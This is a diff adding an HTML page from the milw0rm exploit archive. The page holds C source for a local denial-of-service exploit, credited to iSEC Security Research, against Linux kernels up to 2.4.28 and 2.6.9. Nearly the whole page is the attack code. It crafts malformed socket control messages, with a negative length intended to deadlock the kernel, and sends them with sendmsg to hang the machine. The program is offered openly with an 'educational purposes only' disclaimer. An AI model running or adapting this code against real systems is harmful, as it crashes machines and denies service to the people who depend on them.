@@ -1,0 +1,86 @@
+<html>
+<head>
+<title>Linux Kernel <= 2.4.28 and <= 2.6.9 scm_send local DoS Exploit</title>
+<pre>
+/*
+*      Linux kernel 2.4 &amp; 2.6 __scm_send DoS
+*      Warning! this code will hang your machine
+*
+*      gcc -O2 scmbang.c -o scmbang
+*
+*      Copyright (c) 2004  iSEC Security Research. All Rights Reserved.
+*
+*      THIS PROGRAM IS FOR EDUCATIONAL PURPOSES *ONLY* IT IS PROVIDED &quot;AS IS&quot;
+*      AND WITHOUT ANY WARRANTY. COPYING, PRINTING, DISTRIBUTION, MODIFICATION
+*      WITHOUT PERMISSION OF THE AUTHOR IS STRICTLY PROHIBITED.
+*
+*/
+
+#define _GNU_SOURCE
+#include &lt;stdio.h&gt;
+#include &lt;errno.h&gt;
+#include &lt;sys/socket.h&gt;
+#include &lt;arpa/inet.h&gt;
+
+static char buf[1024];
+
+void
+fatal (const char *msg)
+{
+   printf (&quot;\n&quot;);
+   if (!errno)
+     {
+         fprintf (stderr, &quot;FATAL: %s\n&quot;, msg);
+     }
+   else
+     {
+         perror (msg);
+     }
+   printf (&quot;\n&quot;);
+   fflush (stdout);
+   fflush (stderr);
+   exit (1);
+}
+
+int
+main (void)
+{
+   int s[2], r;
+   struct sockaddr_in sin;
+   struct msghdr *msg;
+   struct cmsghdr *cmsg;
+
+   r = socketpair (AF_UNIX, SOCK_DGRAM, 0, s);
+   if (r &lt; 0)
+       fatal (&quot;socketpair&quot;);
+
+   memset (buf, 0, sizeof (buf));
+   msg = (void *) buf;
+   msg-&gt;msg_control = (void *) (msg + 1);
+
+// make bad cmsgs
+   cmsg = (void *) msg-&gt;msg_control;
+
+   cmsg-&gt;cmsg_len = sizeof (*cmsg);
+   cmsg-&gt;cmsg_level = 0xdeadbebe;
+   cmsg-&gt;cmsg_type = 12;       // len after overflow on second msg
+   cmsg++;
+
+// -12 for deadlock
+   cmsg-&gt;cmsg_len = -12;
+   cmsg-&gt;cmsg_level = SOL_IP;
+   msg-&gt;msg_controllen = (unsigned) (cmsg + 1) - (unsigned) msg-&gt;msg_control;
+   r = sendmsg (s[0], msg, 0);
+   if (r &lt; 0)
+       fatal (&quot;sendmsg&quot;);
+
+   printf (&quot;\nYou lucky\n&quot;);
+   fflush (stdout);
+
+   return 0;
+}
+
+// milw0rm.com [2004-12-14]
+</pre>
+</html>
+
